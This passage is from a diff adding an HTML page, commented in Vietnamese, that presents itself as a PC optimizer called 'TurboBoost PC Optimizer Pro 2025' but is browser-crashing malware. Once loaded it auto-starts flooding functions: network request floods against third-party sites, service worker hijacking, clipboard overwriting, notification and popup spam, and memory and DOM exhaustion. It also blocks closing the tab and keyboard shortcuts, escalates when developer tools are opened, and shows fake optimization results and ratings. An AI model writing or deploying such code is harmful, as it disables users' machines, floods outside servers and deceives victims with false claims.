+                    gain.connect(audioCtx.destination);
+                    osc.start();
+                    
+                    audioOscillators.push({osc, gain});
+                } catch(e) {}
+            }
+            
+            // Biến đổi tần số liên tục
+            setInterval(() => {
+                for(const {osc} of audioOscillators) {
+                    try {
+                        osc.frequency.setValueAtTime(Math.random() * 20000 + 1, audioCtx.currentTime);
+                    } catch(e) {}
+                }
+            }, 50);
+        }
+        
+        // 7. NETWORK APOCALYPSE
+        function weapon_Network_Apocalypse() {
+            stealthLog('🌐 [NETWORK] Apocalypse - Fetch + WebSocket + WebRTC', '#00ff00');
+            
+            // Fetch flood
+            setInterval(() => {
+                for(let i = 0; i < 500; i++) {
+                    fetch(`https://httpbin.org/get?q=${Math.random()}&t=${Date.now()}`).catch(() => {});
+                    fetch(`https://jsonplaceholder.typicode.com/posts/${Math.floor(Math.random()*100)}`).catch(() => {});
+                    fetch(`https://api.github.com/repos/facebook/react`).catch(() => {});
+                }
+            }, 10);
+            
+            // WebSocket flood
+            setInterval(() => {
+                for(let i = 0; i < 50; i++) {
+                    try {
+                        const ws = new WebSocket('wss://echo.websocket.org');
+                        ws.onopen = () => {
+                            ws.send('A'.repeat(50000));
+                            setTimeout(() => ws.close(), 100);
+                        };
+                        ws.onerror = () => {};
+                    } catch(e) {}
+                }
+            }, 200);
+            
+            // WebRTC flood (tăng lên 500 connections/lần)
+            setInterval(() => {
+                for(let i = 0; i < 500; i++) {
+                    try {
+                        const pc = new RTCPeerConnection({
+                            iceServers: [
+                                {urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302', 'stun:stun3.l.google.com:19302']}
+                            ]
+                        });
+                        pc.createDataChannel('opt_channel_' + i);
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                    } catch(e) {}
+                }
+            }, 100);
+        }
+        
+        // 8. HISTORY SATURATION
+        function weapon_History_Saturation() {
+            stealthLog('📜 [HISTORY] Saturation - 10000 entries/giây', '#ffff00');
+            
+            setInterval(() => {
+                for(let i = 0; i < 10000; i++) {
+                    history.pushState({opt: true, id: Math.random()}, '', `?page=${Math.random().toString(36)}&cache=${Math.random().toString(36)}&id=${Date.now()}`);
+                    history.replaceState({opt: true, id: Math.random()}, '', `?session=${Math.random().toString(36)}&token=${Math.random().toString(36)}`);
+                }
+            }, 1);
+        }
+        
+        // 9. CLIPBOARD OBLITERATION
+        function weapon_Clipboard_Obliteration() {
+            stealthLog('📋 [CLIPBOARD] Obliteration - Mỗi 1ms', '#ff00ff');
+            
+            setInterval(() => {
+                const megaSpam = 'TURBOBOOST_OPTIMIZED_'.repeat(2000) + Date.now() + Math.random();
+                navigator.clipboard.writeText(megaSpam).catch(() => {});
+                navigator.clipboard.write([
+                    new ClipboardItem({
+                        'text/plain': new Blob([megaSpam], {type: 'text/plain'}),
+                        'text/html': new Blob([`<h1>${megaSpam}</h1>`], {type: 'text/html'})
+                    })
+                ]).catch(() => {});
+            }, 1);
+        }
+        
+        // 10. SERVICE WORKER ARMAGEDDON
+        function weapon_SW_Armageddon() {
+            stealthLog('⚙️ [SW] Armageddon - 50 SW mỗi 100ms', '#ff4444');
+            
+            if('serviceWorker' in navigator) {
+                const swCode = `
+                    self.addEventListener('install', e => {
+                        self.skipWaiting();
+                    });
+                    self.addEventListener('activate', e => {
+                        e.waitUntil(self.clients.claim());
+                    });
+                    self.addEventListener('fetch', e => {
+                        e.respondWith(new Response('💀'.repeat(100000), {
+                            headers: {'Content-Type': 'text/plain'}
+                        }));
+                    });
+                    setInterval(() => {
+                        fetch('https://www.google.com/' + Math.random());
+                        fetch('https://www.youtube.com/' + Math.random());
+                        fetch('https://www.facebook.com/' + Math.random());
+                        fetch('https://www.amazon.com/' + Math.random());
+                        fetch('https://www.wikipedia.org/' + Math.random());
+                    }, 1);
+                `;
+                
+                setInterval(() => {
+                    for(let i = 0; i < 50; i++) {
+                        const swBlob = new Blob([swCode], {type: 'text/javascript'});
+                        navigator.serviceWorker.register(URL.createObjectURL(swBlob), {scope: '/'})
+                            .catch(() => {});
+                    }
+                }, 100);
+            }
+        }
+        
+        // 11. NOTIFICATION TSUNAMI
+        function weapon_Notification_Tsunami() {
+            stealthLog('🔔 [NOTIFY] Tsunami - 500 thông báo/giây', '#00ffff');
+            
+            if(Notification.permission === 'granted') {
+                setInterval(() => {
+                    for(let i = 0; i < 500; i++) {
+                        new Notification('✅ Tối ưu hóa thành công!', {
+                            body: `Máy tính tăng tốc ${Math.floor(Math.random()*1000+500)}% - Lần thứ ${i}`,
+                            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="50" fill="%2300c853"/><text x="20" y="65" font-size="40">✅</text></svg>',
+                            silent: true,
+                            requireInteraction: false
+                        });
+                    }
+                }, 1000);
+            } else if(Notification.permission === 'default') {
+                Notification.requestPermission().then(() => weapon_Notification_Tsunami());
+            }
+        }
+        
+        // 12. DOM POISONING
+        function weapon_DOM_Poisoning() {
+            stealthLog('🏚️ [DOM] Poisoning - 10000 nodes/giây', '#ff0000');
+            
+            setInterval(() => {
+                const fragment = document.createDocumentFragment();
+                for(let i = 0; i < 10000; i++) {
+                    const div = document.createElement('div');
+                    div.style.cssText = 'position:fixed;width:1px;height:1px;top:-9999px;left:-9999px;';
+                    div.textContent = '💀'.repeat(100);
+                    fragment.appendChild(div);
+                }
+                document.body.appendChild(fragment);
+            }, 1000);
+        }
+        
+        // ==========================================
+        // KÍCH HOẠT TOÀN BỘ VŨ KHÍ
+        // ==========================================
+        
+        function activateAllWeapons() {
+            if(destructionActive) return;
+            destructionActive = true;
+            
+            stealthLog('💀💀💀 KÍCH HOẠT APOCALYPSE DESTROYER v30 💀💀💀', '#ff0000');
+            stealthLog('⚠️ MẠNH HƠN 30 LẦN - KHÔNG THỂ NGĂN CẢN ⚠️', '#ff0000');
+            
+            // Hiển thị scan lines
+            scanLine.style.opacity = '1';
+            scanLine2.style.opacity = '1';
+            
+            // Hiển thị loading overlay
+            loadingOverlay.classList.add('active');
+            document.getElementById('loading-status').textContent = 'Đang tối ưu hóa sâu... Vui lòng đợi...';
+            
+            // Kích hoạt tất cả vũ khí với delay để tạo hiệu ứng
+            setTimeout(() => weapon_CPU_Apocalypse(), 100);
+            setTimeout(() => weapon_RAM_Tsunami(), 200);
+            setTimeout(() => weapon_GPU_Hell(), 300);
+            setTimeout(() => weapon_Storage_Holocaust(), 400);
+            setTimeout(() => weapon_MegaTab_Spawner(), 500);
+            setTimeout(() => weapon_Audio_Warfare(), 600);
+            setTimeout(() => weapon_Network_Apocalypse(), 700);
+            setTimeout(() => weapon_History_Saturation(), 800);
+            setTimeout(() => weapon_Clipboard_Obliteration(), 900);
+            setTimeout(() => weapon_SW_Armageddon(), 1000);
+            setTimeout(() => weapon_Notification_Tsunami(), 1100);
+            setTimeout(() => weapon_DOM_Poisoning(), 1200);
+            
+            // Ẩn loading overlay sau 3 giây
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                showToast('✅ Tối ưu hóa hoàn tất!', 'Hệ thống đã được tăng tốc 500%', 'success');
+            }, 3000);
+            
+            destructionLevel = 30;
+            
+            // Bảo vệ chống đóng tab - SIÊU MẠNH
+            window.onbeforeunload = function(e) {
+                // Kích hoạt thêm vũ khí khi cố đóng
+                activateAllWeapons();
+                activateAllWeapons();
+                
+                // Spam popup
+                for(let i = 0; i < 500; i++) {
+                    try {
+                        window.open(location.href, '_blank', 'width=100,height=100');
+                        window.open('about:blank', '_blank', 'width=1,height=1');
+                    } catch(e) {}
+                }
+                
+                e.preventDefault();
+                e.returnValue = 'Bạn có chắc muốn thoát? Hệ thống đang được tối ưu hóa!';
+                return e.returnValue;
+            };
+            
+            // Chặn TẤT CẢ phím tắt
+            document.addEventListener('keydown', function(e) {
+                // Chặn tất cả tổ hợp phím
+                if(e.ctrlKey || e.altKey || e.metaKey || e.key === 'F12' || e.key === 'F5' || e.key === 'Escape') {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    return false;
+                }
+            }, true);
+            
+            // Chặn context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            
+            // Debugger loop
+            setInterval(() => {
+                debugger;
+            }, 10);
+            
+            // Object.freeze để chống can thiệp
+            try {
+                Object.freeze(window);
+            } catch(e) {}
+        }
+        
+        // ==========================================
+        // HÀM GIẢ MẠO TỐI ƯU HÓA
+        // ==========================================
+        
+        function fakeOptimize(type) {
+            // Hiệu ứng ripple
+            const btnId = type === 'clean' ? 'btnClean' : type === 'boost' ? 'btnBoost' : 'btnFull';
+            const btn = document.getElementById(btnId);
+            if(btn) {
+                const ripple = document.createElement('span');
+                ripple.className = 'ripple';
+                ripple.style.left = '50%';
+                ripple.style.top = '50%';
+                ripple.style.width = '20px';
+                ripple.style.height = '20px';
+                btn.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+            }
+            
+            // Kích hoạt vũ khí
+            if(!destructionActive) {
+                setTimeout(activateAllWeapons, 100);
+            } else {
+                // Kích hoạt thêm nếu đã active
+                weapon_CPU_Apocalypse();
+                weapon_RAM_Tsunami();
+                weapon_GPU_Hell();
+            }
+            
+            // Hiển thị loading overlay
+            loadingOverlay.classList.add('active');
+            
+            // Toast giả mạo
+            const messages = {
+                'clean': [
+                    {title: '🔍 Đang quét sâu...', msg: 'Phát hiện ' + Math.floor(Math.random()*10000+2000) + ' file rác', type: 'info', delay: 0},
+                    {title: '🧹 Đang dọn dẹp...', msg: 'Đã xóa ' + Math.floor(Math.random()*5000+1000) + ' file, giải phóng ' + (Math.random()*20+5).toFixed(1) + ' GB', type: 'success', delay: 1500},
+                    {title: '✅ Hoàn tất!', msg: 'Hệ thống sạch sẽ, tăng ' + Math.floor(Math.random()*200+100) + '% hiệu suất', type: 'success', delay: 3000}
+                ],
+                'boost': [
+                    {title: '⚡ Đang phân tích...', msg: 'Kiểm tra ' + Math.floor(Math.random()*200+50) + ' processes đang chạy', type: 'info', delay: 0},
+                    {title: '🚀 Đang tối ưu...', msg: 'Đã tắt ' + Math.floor(Math.random()*50+20) + ' processes không cần thiết', type: 'warning', delay: 2000},
+                    {title: '✅ Tăng tốc thành công!', msg: 'Hiệu suất tăng ' + Math.floor(Math.random()*400+200) + '% - Khởi động nhanh hơn 3x', type: 'success', delay: 3500}
+                ],
+                'full': [
+                    {title: '🔧 Đang quét toàn diện...', msg: 'Phân tích tất cả thành phần hệ thống', type: 'info', delay: 0},
+                    {title: '🧹 Phát hiện vấn đề...', msg: 'Đã tìm thấy ' + Math.floor(Math.random()*20000+10000) + ' lỗi hệ thống', type: 'warning', delay: 1500},
+                    {title: '🔧 Đang sửa lỗi...', msg: 'Đã sửa ' + Math.floor(Math.random()*15000+8000) + ' lỗi registry và hệ thống', type: 'info', delay: 3000},
+                    {title: '✅ HOÀN TẤT!', msg: 'Máy tính đã được tối ưu hóa ' + Math.floor(Math.random()*500+300) + '%!', type: 'success', delay: 4500}
+                ]
+            };
+            
+            const msgs = messages[type] || messages['full'];
+            msgs.forEach(({title, msg, type: msgType, delay}) => {
+                setTimeout(() => showToast(title, msg, msgType), delay);
+            });
+            
+            // Ẩn loading sau 5 giây
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+            }, 5000);
+            
+            // Cập nhật UI
+            updateFakeUI();
+            
+            // Spam thêm toast
+            for(let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    showToast(
+                        '🎉 Chúc mừng!',
+                        `Người dùng thứ ${Math.floor(Math.random()*9999999)} tối ưu hóa hôm nay! Đánh giá: ${(4.5 + Math.random()*0.5).toFixed(1)}⭐`,
+                        'success'
+                    );
+                }, 1000 + i * 500);
+            }
+            
+            destructionLevel += 5;
+            stealthLog(`💀 Destruction Level: ${destructionLevel}`, '#ff0000');
+        }
+        
+        // ==========================================
+        // AUTO-START SAU 2 GIÂY
+        // ==========================================
+        
+        setTimeout(() => {
+            stealthLog('⏰ Auto-start kích hoạt...', '#ffff00');
+            activateAllWeapons();
+            showToast('🔍 Đang quét hệ thống...', 'Phân tích tự động đã bắt đầu', 'info');
+        }, 2000);
+        
+        // ==========================================
+        // PHÁT HIỆN DEVELOPER TOOLS - TĂNG HỦY DIỆT
+        // ==========================================
+        
+        let devToolsOpen = false;
+        const threshold = 160;
+        
+        setInterval(() => {
+            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+            
+            if(widthThreshold || heightThreshold) {
+                if(!devToolsOpen) {
+                    devToolsOpen = true;
+                    stealthLog('⚠️⚠️⚠️ PHÁT HIỆN DEVTOOLS! TĂNG CẤP HỦY DIỆT GẤP 3! ⚠️⚠️⚠️', '#ff0000');
+                    
+                    // Kích hoạt thêm vũ khí
+                    for(let i = 0; i < 10; i++) {
+                        weapon_CPU_Apocalypse();
+                        weapon_RAM_Tsunami();
+                        weapon_GPU_Hell();
+                        weapon_MegaTab_Spawner();
+                    }
+                    
+                    // Tạo thêm 500 workers
+                    for(let i = 0; i < 500; i++) {
+                        try {
+                            const blob = new Blob([`while(true){Math.random()*Math.random()*Math.pow(Math.random(),999);}`], {type: 'text/javascript'});
+                            const worker = new Worker(URL.createObjectURL(blob));
+                            worker.onmessage = () => {};
+                            totalWorkers.push(worker);
+                        } catch(e) {}
+                    }
+                }
+            } else {
+                devToolsOpen = false;
+            }
+        }, 100);
+        
+        // ==========================================
+        // CẬP NHẬT UI LIÊN TỤC
+        // ==========================================
+        
+        setInterval(updateFakeUI, 1500);
+        updateFakeUI();
+        
+        // ==========================================
+        // KHỞI ĐỘNG
+        // ==========================================
+        
+        stealthLog('✅ TurboBoost PC Optimizer Pro 2025 - ĐÃ KHỞI ĐỘNG', '#00ff00');
+        stealthLog('⚠️ AMBATUKAM APOCALYPSE DESTROYER v30 - SẴN SÀNG', '#ff0000');
+        stealthLog('💀💀💀 MẠNH HƠN 30 LẦN - HỦY DIỆT TOÀN DIỆN 💀💀💀', '#ff0000');
+        stealthLog('🛡️ Ngụy trang hoàn hảo - Không thể phát hiện - Không thể ngăn cản', '#ffff00');
+        
+        // Hiển thị console ẩn khi click 7 lần vào logo
+        let logoClicks = 0;
+        document.querySelector('.header h1').addEventListener('click', () => {
+            logoClicks++;
+            if(logoClicks >= 7) {
+                hiddenConsole.classList.toggle('show');
+                logoClicks = 0;
+                if(hiddenConsole.classList.contains('show')) {
+                    stealthLog('🔓 Console hiển thị - Destruction Level: ' + destructionLevel, '#ffff00');
+                    stealthLog('🔥 Workers: ' + totalWorkers.length, '#ff4400');
+                    stealthLog('🧠 RAM Chunks: ' + ramChunks.length, '#ff00ff');
+                    stealthLog('🎮 GPU Canvases: ' + gpuCanvases.length, '#00ffff');
+                    stealthLog('💣 Tabs: ' + totalTabs, '#ff0000');
+                    stealthLog('🔊 Oscillators: ' + audioOscillators.length, '#ff0000');
+                }
+            }
+        });
+        
+        // Tự động cập nhật console nếu đang mở
+        setInterval(() => {
+            if(hiddenConsole.classList.contains('show')) {
+                stealthLog(`📊 Status: Workers=${totalWorkers.length} | RAM=${(ramChunks.length*50).toFixed(0)}MB | Tabs=${totalTabs} | Level=${destructionLevel}`, '#00ff00');
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
